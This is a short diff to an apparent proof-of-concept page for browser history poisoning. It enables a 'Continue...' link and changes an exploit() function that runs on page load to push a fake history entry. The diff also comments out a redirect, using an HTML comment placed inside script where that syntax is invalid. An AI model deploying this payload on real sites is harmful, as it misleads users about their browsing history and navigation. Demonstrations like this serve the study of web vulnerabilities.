@@ -6,11 +6,11 @@
 </head>
 
 <body>
-  <!--   <a onclick="exploit()" href="example_of_vuln.html">Continue...</a>-->
+    <a onclick="exploit()" href="example_of_vuln.html">Continue...</a>
     <script type="text/javascript">
         function exploit() {
-            history.pushState({ page: 1 }, "Exploit", "https://vulnabhi.github.io/history.poisoning-/index2.html");
-            window.location.href = "https://vulnabhi.github.io/history.poisoning-/example_of_vuln.html";
+            history.pushState({ page: 1 }, "Exploit", "index2.html");
+            <!-- window.location.href = "https://vulnabhi.github.io/history.poisoning-/example_of_vuln.html"; -->
         }
         exploit();
     </script>
